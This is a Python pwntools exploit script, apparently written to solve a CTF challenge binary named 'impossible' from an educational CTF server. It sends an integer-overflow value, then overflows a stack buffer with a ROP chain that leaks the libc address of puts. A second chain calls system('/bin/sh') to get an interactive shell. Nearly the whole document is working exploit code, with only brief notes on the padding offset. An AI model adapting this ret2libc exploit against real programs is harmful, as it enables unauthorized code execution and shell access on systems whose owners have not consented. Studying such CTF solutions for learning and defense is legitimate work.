from pwn import *
context.log_level = 'DEBUG'
offset =(256+8)
elf=ELF('./impossible')
lib=ELF('./libc-2.27.so')
rop=ROP(elf)
# r=remote('eductf.zoolab.org',10105)
r=process('./impossible')
r.recvuntil(': ')
r.sendline('2147483648')
r.recvuntil(':)')
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]
log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
FUNC_GOT = elf.got['puts']
rop1 = 'a'*offset + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
r.sendline(rop1)

r.recvuntil(': ')
leak=raw_input('in:')    #lazy to fix
libc_base=int(leak,16)-lib.symbols['puts']
r.sendline('2147483648')
r.recvuntil(':)')
log.info(hex(libc_base))
BINSH = next(lib.search("/bin/sh"))
SYSTEM = lib.sym["system"]
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
rop2 ='a'*offset+ p64(POP_RDI) + p64(BINSH+libc_base) +p64(RET)+ p64(SYSTEM+libc_base)
r.sendline(rop2)
r.interactive()
'''
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
256+4 ok
256+8 seg
'''
